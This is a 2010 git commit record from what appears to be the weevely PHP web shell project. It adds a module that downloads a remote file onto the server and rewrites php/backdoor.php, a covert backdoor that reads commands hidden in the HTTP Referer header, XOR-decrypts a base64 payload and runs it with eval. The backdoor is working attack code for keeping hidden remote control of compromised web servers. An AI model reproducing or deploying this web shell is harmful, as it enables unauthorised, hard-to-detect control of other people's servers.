a47cc7ecaee7a482af0d6e646b3a6359569231f5
sattacarlo <sattacarlo@5205769a-2ae6-11df-b744-258d51847b74>
2010-03-09 22:44:27 +0000

    Primo Modulo
    git-svn-id: http://weevely.googlecode.com/svn/trunk@26 5205769a-2ae6-11df-b744-258d51847b74

---
+++ modules/download_file.php
@@ -0,0 +1,18 @@
+$c = explode(' ', $r[1]);
+echo file_put_contents($c[1], file_get_contents($c[0]))."\n"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
--- php/backdoor.php
+++ php/backdoor.php
@@ -1,5 +1,4 @@
 <?php
-	parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')+1), $r);	$r=array_values($r);
-	$t=base64_decode('%%%TEXT-CRYPTED%%%');
-	eval(c($t, $r[0]));function c($t='', $k=''){return (($t ^ str_pad("", strlen($t), $k)) & str_repeat("\x1f", strlen($t))) | ($t & str_repeat("\xe0", strlen($t)));}
+	__g();function __g(){parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')+1), $r);	$r=array_values($r);
+	$t=base64_decode('%%%TEXT-CRYPTED%%%');eval(c($t, $r[0]));}function c($t='', $k=''){return (($t ^ str_pad("", strlen($t), $k)) & str_repeat("\x1f", strlen($t))) | ($t & str_repeat("\xe0", strlen($t)));}	
 ?>
